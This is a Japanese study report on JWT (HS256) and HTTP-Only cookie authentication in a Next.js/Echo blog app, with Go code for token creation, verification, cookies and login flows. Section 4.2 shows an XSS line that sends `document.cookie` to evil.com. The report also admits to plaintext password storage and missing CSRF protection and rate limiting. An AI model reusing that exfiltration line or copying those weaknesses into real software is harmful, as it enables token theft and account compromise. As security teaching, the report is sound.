# JWT (HS256) / HTTP-Only Cookie 理解向上レポート

本レポートは、**JWT（JSON Web Token）** と **HTTP-Only Cookie** を使用した認証システムについて、本プロジェクト（nextjs-echo-back-blog-app）の実装を題材に技術理解を深めるためのドキュメントである。

---

## 目次

- [1. JWT とは何か](#1-jwt-とは何か)
  - [1.1 概要](#11-概要)
  - [1.2 JWT の3つの構成要素](#12-jwt-の3つの構成要素)
  - [1.3 HS256（HMAC-SHA256）署名](#13-hs256hmac-sha256署名)
- [2. 本プロジェクトの Claims 構造](#2-本プロジェクトの-claims-構造)
  - [2.1 認証用 Claims](#21-認証用-claims)
  - [2.2 訪問者ID用 Claims](#22-訪問者id用-claims)
- [3. HTTP-Only Cookie とは何か](#3-http-only-cookie-とは何か)
  - [3.1 Cookie の種類と攻撃リスク](#31-cookie-の種類と攻撃リスク)
  - [3.2 トークン格納場所の比較](#32-トークン格納場所の比較)
- [4. Cookie のセキュリティ属性](#4-cookie-のセキュリティ属性)
  - [4.1 本プロジェクトの設定](#41-本プロジェクトの設定)
  - [4.2 各属性の詳細解説](#42-各属性の詳細解説)
  - [4.3 環境別設定の全体像](#43-環境別設定の全体像)
- [5. 認証フロー全体像](#5-認証フロー全体像)
  - [5.1 ログインフロー](#51-ログインフロー)
  - [5.2 認証付きリクエスト](#52-認証付きリクエスト)
  - [5.3 認証確認フロー](#53-認証確認フロー)
  - [5.4 ログアウトフロー](#54-ログアウトフロー)
- [6. 訪問者ID（Visit ID）トークン](#6-訪問者idvisit-idトークン)
  - [6.1 仕組み](#61-仕組み)
  - [6.2 認証トークンとの比較](#62-認証トークンとの比較)
- [7. トークン生成の実装詳細](#7-トークン生成の実装詳細)
  - [7.1 認証トークン生成](#71-認証トークン生成)
  - [7.2 トークン検証](#72-トークン検証)
- [8. セキュリティの考慮事項](#8-セキュリティの考慮事項)
  - [8.1 JWT の特性と注意点](#81-jwt-の特性と注意点)
  - [8.2 本プロジェクトの既知のセキュリティ課題](#82-本プロジェクトの既知のセキュリティ課題)
  - [8.3 JWTトークンのペイロードは読める](#83-jwtトークンのペイロードは読める)
- [9. JWT vs セッションベース認証](#9-jwt-vs-セッションベース認証)
- [10. まとめ：学習ポイント](#10-まとめ学習ポイント)

---

## 1. JWT とは何か

### 1.1 概要

JWT（JSON Web Token）は、当事者間で情報を安全に伝達するためのオープン標準（RFC 7519）である。トークンはBase64エンコードされた3つの部分で構成され、`.（ドット）` で連結される。

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.     ← Header
eyJ1c2VyX2lkIjoiYWJjMTIzIiwiZW1haWwiOi...  ← Payload
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQ...  ← Signature
```

### 1.2 JWT の3つの構成要素

```
┌──────────────────────────────────────────────────────┐
│                    JWT Token                          │
│                                                      │
│  ┌─────────┐   ┌──────────────┐   ┌──────────────┐  │
│  │ Header  │ . │   Payload    │ . │  Signature   │  │
│  │         │   │              │   │              │  │
│  │ alg:    │   │ user_id:     │   │ HMAC-SHA256  │  │
│  │  HS256  │   │  "abc-123"   │   │ (Header +    │  │
│  │ typ:    │   │ email:       │   │  Payload +   │  │
│  │  JWT    │   │  "a@b.com"   │   │  Secret)     │  │
│  │         │   │ exp:         │   │              │  │
│  │         │   │  1700000000  │   │              │  │
│  └─────────┘   └──────────────┘   └──────────────┘  │
└──────────────────────────────────────────────────────┘
```

| 部分 | 内容 | 暗号化 |
|------|------|--------|
| **Header** | 署名アルゴリズム（HS256）とトークン種別（JWT） | Base64エンコード（暗号化ではない） |
| **Payload** | ユーザー情報と有効期限（Claims） | Base64エンコード（暗号化ではない） |
| **Signature** | Header + Payload を秘密鍵で署名したハッシュ値 | HMAC-SHA256で計算 |

### 1.3 HS256（HMAC-SHA256）署名

本プロジェクトが採用している **HS256** は、対称鍵方式の署名アルゴリズムである。

```
署名の生成：
  HMAC-SHA256(
    Base64(Header) + "." + Base64(Payload),
    秘密鍵（JWT_SECRET_KEY）
  ) → Signature

署名の検証：
  受信したトークンを同じ秘密鍵で再計算 → 一致すれば改ざんなし
```

**対称鍵 vs 非対称鍵：**

| 方式 | アルゴリズム | 特徴 | 適用場面 |
|------|------------|------|---------|
| 対称鍵 | **HS256** | 署名と検証に同じ鍵を使用 | 単一サービス（本プロジェクト） |
| 非対称鍵 | RS256 | 秘密鍵で署名、公開鍵で検証 | マイクロサービス間認証 |

本プロジェクトはバックエンドが1つのサービスであるため、HS256で十分である。

---

## 2. 本プロジェクトの Claims 構造

### 2.1 認証用 Claims

```go
// models/auth.go
type Claims struct {
    UserID   string `json:"user_id"`   // ユーザーUUID
    Email    string `json:"email"`     // メールアドレス
    Username string `json:"username"`  // ユーザー名
    jwt.StandardClaims                 // ExpiresAt（有効期限）を含む
}
```

デコードされたペイロード例：
```json
{
  "user_id": "550e8400-e29b-41d4-a716-446655440000",
  "email": "admin@example.com",
  "username": "kojikawazu",
  "exp": 1710900000
}
```

### 2.2 訪問者ID用 Claims

```go
// models/auth.go
type ClaimsVisitId struct {
    VisitId string `json:"visit_id"`   // 訪問者UUID
    jwt.StandardClaims                  // ExpiresAt を含む
}
```

**なぜ訪問者にもJWTを使うのか？**
- 単純なUUID文字列をCookieに入れると、誰でも偽造できる
- JWTで署名することで、サーバーが発行した正規の訪問者IDであることを検証できる

---

## 3. HTTP-Only Cookie とは何か

### 3.1 Cookie の種類と攻撃リスク

```
┌─────────────────────────────────────────────────────────┐
│                   ブラウザ                                │
│                                                         │
│  ┌──────────────────┐     ┌──────────────────────────┐  │
│  │  通常のCookie     │     │  HTTP-Only Cookie        │  │
│  │                  │     │                          │  │
│  │  JavaScriptから   │     │  JavaScriptから           │  │
│  │  読み取り可能 ⚠️   │     │  読み取り不可能 ✅         │  │
│  │                  │     │                          │  │
│  │  document.cookie │     │  document.cookie では     │  │
│  │  でアクセス可能    │     │  アクセスできない          │  │
│  │                  │     │                          │  │
│  │  XSS攻撃で       │     │  XSS攻撃されても          │  │
│  │  トークン窃取可能  │     │  トークンは安全            │  │
│  └──────────────────┘     └──────────────────────────┘  │
│                                                         │
│  HTTPリクエスト時：両方とも自動的にサーバーに送信される       │
└─────────────────────────────────────────────────────────┘
```

### 3.2 トークン格納場所の比較

| 格納場所 | XSS攻撃 | CSRF攻撃 | 実装の簡単さ |
|---------|---------|---------|-------------|
| `localStorage` | 脆弱 ❌ | 安全 ✅ | 簡単 |
| `sessionStorage` | 脆弱 ❌ | 安全 ✅ | 簡単 |
| 通常Cookie | 脆弱 ❌ | 脆弱 ❌ | 中程度 |
| **HTTP-Only Cookie** | **安全 ✅** | **要対策 ⚠️** | やや複雑 |

本プロジェクトは **HTTP-Only Cookie** を採用し、XSS攻撃からトークンを保護している。

---

## 4. Cookie のセキュリティ属性

### 4.1 本プロジェクトの設定

```go
// utils/cookie/cookie_token_di.go
func (cu *CookieUtilsImpl) AddAuthCookie(
    c echo.Context, tokenString string, expirationTime time.Time,
) {
    cookie := new(http.Cookie)
    cookie.Name = "token"
    cookie.Value = tokenString
    cookie.Expires = expirationTime
    cookie.Path = "/"
    cookie.HttpOnly = true  // JavaScript からアクセス不可

    if config.IsProduction {
        cookie.Secure = true                    // HTTPSのみ
        cookie.SameSite = http.SameSiteNoneMode // クロスオリジンOK
    } else {
        cookie.Secure = false                   // HTTP許可（開発用）
        cookie.SameSite = http.SameSiteLaxMode  // 同一サイト + トップレベルナビ
    }

    c.SetCookie(cookie)
}
```

### 4.2 各属性の詳細解説

#### HttpOnly = true

```
JavaScript:
  document.cookie  →  "token" は見えない
  fetch("/api")    →  Cookie は自動送信される

攻撃者が XSS で埋め込んだスクリプト:
  <script>
    // HTTP-Only Cookie なので取得できない！
    fetch("https://evil.com?token=" + document.cookie)
  </script>
```

#### Secure（本番環境: true）

```
HTTP  (http://example.com)  → Cookie送信されない ✅（傍受防止）
HTTPS (https://example.com) → Cookie送信される
```

#### SameSite

```
SameSiteNoneMode（本番環境）:
  https://frontend.example.com → https://api.example.com
  ↑ 異なるドメイン間でもCookieが送信される（Secure必須）
  ※ フロントエンドとバックエンドが異なるドメインにデプロイされているため

SameSiteLaxMode（開発環境）:
  http://localhost:3000 → http://localhost:8080
  ↑ トップレベルナビゲーション時のみCookieが送信される
  ※ CSRF攻撃の基本的な防御を提供
```

### 4.3 環境別設定の全体像

```
本番環境（ENV=production）:
┌──────────────────────────────────────────────┐
│ Cookie: token=eyJhbGc...                      │
│   HttpOnly: true     ← JS読み取り不可         │
│   Secure: true       ← HTTPS必須              │
│   SameSite: None     ← クロスオリジン許可      │
│   Path: /            ← 全パスで有効            │
│   Expires: +1h       ← 1時間で失効             │
└──────────────────────────────────────────────┘

開発環境:
┌──────────────────────────────────────────────┐
│ Cookie: token=eyJhbGc...                      │
│   HttpOnly: true     ← JS読み取り不可         │
│   Secure: false      ← HTTP許可               │
│   SameSite: Lax      ← 同一サイト制限         │
│   Path: /            ← 全パスで有効            │
│   Expires: +1h       ← 1時間で失効             │
└──────────────────────────────────────────────┘
```

---

## 5. 認証フロー全体像

### 5.1 ログインフロー

```
ブラウザ                        バックエンド (Echo)                    DB (Supabase)
  │                                │                                    │
  │  POST /api/users/login         │                                    │
  │  {"email":"a@b.com",           │                                    │
  │   "password":"pass123"}        │                                    │
  │──────────────────────────────→│                                    │
  │                                │                                    │
  │                                │  (1) バリデーション                  │
  │                                │   - email/password 空チェック       │
  │                                │   - メール形式チェック               │
  │                                │                                    │
  │                                │  (2) ユーザー検索                   │
  │                                │   WHERE email=$1 AND password=$2   │
  │                                │──────────────────────────────────→│
  │                                │                                    │
  │                                │←──────────────────────────────────│
  │                                │   ユーザーデータ返却                 │
  │                                │                                    │
  │                                │  (3) JWTトークン生成                │
  │                                │   Claims: {user_id, email, name}  │
  │                                │   有効期限: 1時間                   │
  │                                │   署名: HS256 + JWT_SECRET_KEY    │
  │                                │                                    │
  │  200 OK                        │                                    │
  │  Set-Cookie: token=eyJ...;     │                                    │
  │    HttpOnly; Secure; Path=/    │                                    │
  │←──────────────────────────────│                                    │
  │                                │                                    │
  │  ブラウザがCookieを自動保存     │                                    │
```

### 5.2 認証付きリクエスト

```
ブラウザ                        バックエンド (Echo)
  │                                │
  │  POST /api/blogs/create        │
  │  Cookie: token=eyJ...          │  ← ブラウザが自動付与
  │  {"title":"新しい記事",...}      │
  │──────────────────────────────→│
  │                                │
  │                                │  (1) Cookie "token" を取得
  │                                │  (2) JWT を検証
  │                                │   - 署名が正しいか？
  │                                │   - 有効期限内か？
  │                                │  (3) Claims から userId を取得
  │                                │  (4) ブログ作成処理を実行
  │                                │
  │  201 Created                   │
  │  {"id":"...","title":"..."}    │
  │←──────────────────────────────│
```

### 5.3 認証確認フロー

```go
// handlers/auth/auth_impl.go — CheckAuth の実装
func (h *AuthHandler) CheckAuth(c echo.Context) error {
    // (1) Cookieからトークンを取得
    cookie, err := c.Cookie("token")
    if err != nil {
        return c.JSON(http.StatusUnauthorized,
            map[string]string{"message": "Token not found"})
    }

    // (2) トークンを検証（署名 + 有効期限）
    claims := &models.Claims{}
    token, err := jwt.ParseWithClaims(
        cookie.Value,
        claims,
        func(token *jwt.Token) (interface{}, error) {
            return config.JwtKey, nil  // 検証に使う秘密鍵
        },
    )

    // (3) 検証結果に応じてレスポンス
    if err != nil || !token.Valid {
        return c.JSON(http.StatusUnauthorized,
            map[string]string{"message": "Invalid token"})
    }

    return c.JSON(http.StatusOK, map[string]string{
        "message":  "Authenticated",
        "user_id":  claims.UserID,
        "username": claims.Username,
        "email":    claims.Email,
    })
}
```

### 5.4 ログアウトフロー

```go
// handlers/auth/auth_impl.go — Logout の実装
func (h *AuthHandler) Logout(c echo.Context) error {
    // Cookieの有効期限を過去に設定 → ブラウザが自動削除
    utils_cookie.DelAuthCookie(c)
    return c.JSON(http.StatusOK,
        map[string]string{"message": "Logout successful"})
}

// utils/cookie/cookie_token_di.go
func (cu *CookieUtilsImpl) DelAuthCookie(c echo.Context) {
    cookie := new(http.Cookie)
    cookie.Name = "token"
    cookie.Value = ""                        // 値を空に
    cookie.Expires = time.Unix(0, 0)         // 1970年1月1日 → 過去
    cookie.Path = "/"
    cookie.HttpOnly = true
    // ... Secure, SameSite 設定
    c.SetCookie(cookie)
}
```

**なぜサーバー側でトークンを無効化しないのか？**
- JWTはステートレスであり、サーバーに発行済みトークンのリストを保持しない
- ログアウト＝Cookieの削除によりクライアントからトークンを消去
- これによりCloud Runの水平スケーリングが容易になる（サーバー間でセッション共有不要）

---

## 6. 訪問者ID（Visit ID）トークン

### 6.1 仕組み

匿名の訪問者がいいね機能を使えるようにするための仕組み。

```
初回訪問:
  GET /api/blog-likes/generate-visit-id
    ↓
  サーバー: UUID生成 → JWT化 → visit-id-token Cookie設定
    ↓
  ブラウザ: Cookie保存

いいね操作:
  POST /api/blog-likes/create/:blogId
  Cookie: visit-id-token=eyJ...   ← 自動送信
    ↓
  サーバー: JWT検証 → visitId取得 → DBに保存
```

### 6.2 認証トークンとの比較

| 項目 | 認証トークン（token） | 訪問者トークン（visit-id-token） |
|------|---------------------|-------------------------------|
| 目的 | ブログオーナーの認証 | 匿名訪問者の識別 |
| Cookie名 | `token` | `visit-id-token` |
| ペイロード | user_id, email, username | visit_id（UUID） |
| 有効期限 | 1時間 | 1時間 |
| 取得方法 | ログイン（email + password） | 自動生成（GET要求のみ） |
| 用途 | ブログCRUD、プロフィール管理 | いいね追加・削除・確認 |

---

## 7. トークン生成の実装詳細

### 7.1 認証トークン生成

```go
// utils/cookie/cookie_token_di.go
func (cu *CookieUtilsImpl) CreateToken(
    user *models.BlogUsersData,
) (string, error) {
    // (1) 有効期限を設定
    expirationTime := time.Now().Add(1 * time.Hour)

    // (2) Claims構造体を作成
    claims := &models.Claims{
        UserID:   user.ID,
        Email:    user.Email,
        Username: user.Name,
        StandardClaims: jwt.StandardClaims{
            ExpiresAt: expirationTime.Unix(),
        },
    }

    // (3) HS256アルゴリズムでトークンオブジェクト作成
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)

    // (4) 秘密鍵で署名してトークン文字列を生成
    tokenString, err := token.SignedString(config.JwtKey)
    if err != nil {
        return "", err
    }

    return tokenString, nil
}
```

### 7.2 トークン検証

```go
// utils/cookie/cookie_common_di.go
func (cu *CookieUtilsImpl) VerifyToken(
    c echo.Context, tokenString string,
) (*models.Claims, error) {
    claims := &models.Claims{}

    // (1) トークンをパースし、署名を検証
    token, err := jwt.ParseWithClaims(
        tokenString,
        claims,
        func(token *jwt.Token) (interface{}, error) {
            return config.JwtKey, nil  // 同じ秘密鍵で検証
        },
    )

    if err != nil {
        return nil, err
    }

    // (2) トークンの有効性チェック
    if !token.Valid {
        return nil, errors.New("invalid token")
    }

    // (3) 有効期限チェック
    expirationTime := time.Unix(claims.ExpiresAt, 0)
    if expirationTime.Before(time.Now()) {
        return nil, errors.New("token expired or invalid")
    }

    return claims, nil
}
```

---

## 8. セキュリティの考慮事項

### 8.1 JWT の特性と注意点

```
JWT の特性：
┌────────────────────────────────────────────────────┐
│  ✅ ステートレス — サーバーにセッション情報不要       │
│  ✅ 自己完結型 — トークン自体に必要な情報を含む       │
│  ✅ 改ざん検知 — 署名で内容の改ざんを検出可能         │
│  ⚠️ 無効化困難 — 発行後に取り消す仕組みがない        │
│  ⚠️ 暗号化なし — Base64は暗号化ではなくデコード可能  │
│  ⚠️ サイズ — Cookieの4KBサイズ制限に注意             │
└────────────────────────────────────────────────────┘
```

### 8.2 本プロジェクトの既知のセキュリティ課題

| 課題 | 影響 | 現状 |
|------|------|------|
| CSRF保護なし | SameSite=None + Cookie認証でCSRF攻撃リスク | 未対応 |
| パスワード平文保存 | DB漏洩時にパスワード流出 | 未対応 |
| トークン無効化不可 | ログアウト後もトークンが有効（1時間） | Cookie削除のみ |
| レート制限なし | ブルートフォース攻撃の可能性 | 未対応 |

### 8.3 JWTトークンのペイロードは読める

```
重要な注意：JWTのペイロードはBase64エンコードされているだけで、
暗号化されていない。誰でもデコードして中身を読める。

echo "eyJ1c2VyX2lkIjoiYWJjMTIzIn0" | base64 -d
→ {"user_id":"abc123"}

したがって、パスワードや機密情報をペイロードに含めてはならない。
```

---

## 9. JWT vs セッションベース認証

| 項目 | JWT（本プロジェクト） | セッションID |
|------|---------------------|-------------|
| サーバー側状態 | なし（ステートレス） | セッションストア必要 |
| スケーラビリティ | 水平スケーリング容易 | セッション共有が必要（Redis等） |
| トークン無効化 | 困難（有効期限のみ） | サーバー側で即座に無効化可能 |
| データサイズ | ペイロード次第で大きい | 固定長のセッションID |
| Cloud Run適合性 | 最適（ステートレス） | 要外部ストア |

本プロジェクトではCloud Runのステートレス環境に適合するJWTを採用している。

---

## 10. まとめ：学習ポイント

| # | ポイント | 本プロジェクトでの実践 |
|---|---------|---------------------|
| 1 | JWTは署名で改ざんを検知するが暗号化ではない | ペイロードに機密情報を含めない |
| 2 | HS256は対称鍵方式で単一サービスに適切 | `JWT_SECRET_KEY` で署名・検証 |
| 3 | HTTP-Only CookieはXSS攻撃からトークンを保護 | 全Cookie設定で `HttpOnly: true` |
| 4 | Secure属性はHTTPS通信を強制する | 本番: `Secure: true` |
| 5 | SameSiteはCSRF攻撃の防御レベルを制御 | 本番: `None`（クロスオリジン必須）、開発: `Lax` |
| 6 | ログアウトはCookie有効期限を過去に設定して実現 | `time.Unix(0, 0)` で削除 |
| 7 | 訪問者IDもJWT化することで偽造を防止 | `visit-id-token` Cookie |
| 8 | 環境別Cookie設定で開発と本番を安全に切り替え | `config.IsProduction` で分岐 |
